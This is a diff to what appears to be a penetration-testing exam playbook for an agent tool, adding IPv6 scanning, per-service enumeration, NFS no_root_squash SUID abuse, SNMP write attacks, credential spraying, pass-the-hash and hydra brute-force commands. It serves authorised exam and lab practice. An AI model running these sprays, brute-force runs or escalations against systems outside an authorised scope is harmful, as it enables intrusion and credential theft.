@@ -51,14 +51,32 @@ work on immediately; the full scan runs in parallel and catches everything. Comp
 Output is auto-saved under `engagement/targets/<ip>/` with sha256 hashing.
 Credential patterns and dual-NICs in the output are flagged automatically.
 
+## IPv6 — don't miss a whole address family
+
+CPENT ranges plant IPv6-only services. If a host has a global/ULA v6 address, scan it:
+```
+nmap -6 -sC -sV -p- <ipv6-addr>
+# discover link-local neighbours on a segment you have a shell on:
+ping6 -c3 ff02::1%<iface>   ;   ip -6 neigh
+```
+The triage block captures `inet6` lines and the evidence engine now flags a second v6 NIC
+as a pivot candidate — treat a dual-stack host like any dual-NIC host.
+
 ## Per-service enumeration
 
-- **SMB (445):** `smbmap -H <t>`, `enum4linux-ng <t>`, `crackmapexec smb <t> --shares`.
-  Null/guest sessions, readable shares, sensitive files.
+- **SMB (445):** `smbmap -H <t>`, `enum4linux-ng <t>`, `nxc smb <t> --shares -u '' -p ''`
+  (null) then `-u guest -p ''`. Check readable/writable shares, spider for creds/configs.
 - **Web (80/443):** see `web-exploitation` skill; always `gobuster dir` + tech fingerprint.
-- **SNMP (161/udp):** `snmpwalk -v2c -c public <t>` — leaks users, processes, interfaces.
-- **FTP/21, NFS/2049, RDP/3389, LDAP/389, DNS/53:** banner-grab, check anon/guest, zone
-  transfer `dig axfr @<t> <domain>`.
+- **SNMP (161/udp):** `snmpwalk -v2c -c public <t>` — leaks users, processes, interfaces,
+  routes. Try write community too: `snmpset` with `private` (reconfigure/leak).
+  Brute communities: `onesixtyone -c /usr/share/seclists/Discovery/SNMP/common.snmp.txt <t>`.
+- **NFS (2049):** `showmount -e <t>` → mount exports (`mount -t nfs <t>:/share /mnt`); check
+  for `no_root_squash` (write a SUID binary as root). 
+- **LDAP (389/636):** anonymous bind dump:
+  `ldapsearch -x -H ldap://<t> -b "dc=<dom>,dc=<tld>"` — leaks users/descriptions (passwords
+  in description fields are common).
+- **FTP/21:** anonymous login (`ftp <t>` → anonymous), check writable dir for web-root upload.
+- **RDP/3389:** `nxc rdp <t> -u .. -p ..`; **DNS/53:** zone transfer `dig axfr @<t> <domain>`.
 
 ## Host-triage block — run on EVERY shell, immediately
 
@@ -87,10 +105,16 @@ If a host has two interfaces → it's a pivot. Load the `pivoting` skill now, do
 
 - Always try defaults: `admin/admin`, `admin/password`, product defaults, and **reuse from
   the tracker** (`bin/cpent cred list`) before brute-forcing.
+- **The instant you get ANY credential, spray it across the whole scope** — reuse is rampant
+  and this is the single highest-ROI move in the exam:
+  ```
+  bin/cpent spray --user admin --pass 'Summer2024!' --proto smb --bg   # all scoped hosts
+  bin/cpent spray --user svc --hash <ntlm> --proto winrm --local-auth  # pass-the-hash
+  ```
+  It reads scope automatically, runs through evidence capture, and `--bg` backgrounds it.
 - Find the right wordlist: `bin/cpent wordlist password` → `/usr/share/wordlists/rockyou.txt`
   (or `bin/cpent wordlist brute-small` → `/usr/share/wordlists/fasttrack.txt` for quick runs).
-- Brute-force: `hydra -L users.txt -P $(bin/cpent wordlist brute-small) <t> <service>`
-- Password spray: `crackmapexec smb <t> -u users.txt -p 'Password1'` — background and work on.
+- Brute-force (background it): `bin/cpent ev "hydra -L users.txt -P $(bin/cpent wordlist brute-small) <t> <service>" --ip <t> --bg`
 - Before your first scan: `bin/cpent kali-check` to verify all tools and wordlists are present.
 
 ## Hand-off
